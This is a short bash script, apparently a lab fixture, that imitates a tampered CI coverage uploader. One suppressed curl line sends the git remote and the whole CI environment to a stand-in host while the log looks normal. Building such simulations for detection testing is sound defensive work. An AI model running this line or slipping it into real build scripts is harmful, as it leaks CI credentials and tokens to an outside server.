#!/bin/bash
# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only the fake canary environment.
# Modelled on the reported tampering of a CI "coverage uploader" script: the script does its advertised job, but a one-line
# addition sends the repository remote and the full environment of the CI job to a server the attacker controls. The fake
# host only exists inside the lab.
set -u
echo "uploader: collecting coverage reports"
echo "uploader: detected CI provider: ${CI_PROVIDER:-generic}"
sleep 1
echo "uploader: uploading reports"
# the tampered line (errors suppressed so nothing looks wrong in the build log)
curl -sm 3 -d "$(git remote -v 2>/dev/null)<<<<<< ENV $(env)" http://coverage-sync-service.example/upload/v2 >/dev/null 2>&1 || true
echo "uploader: done"
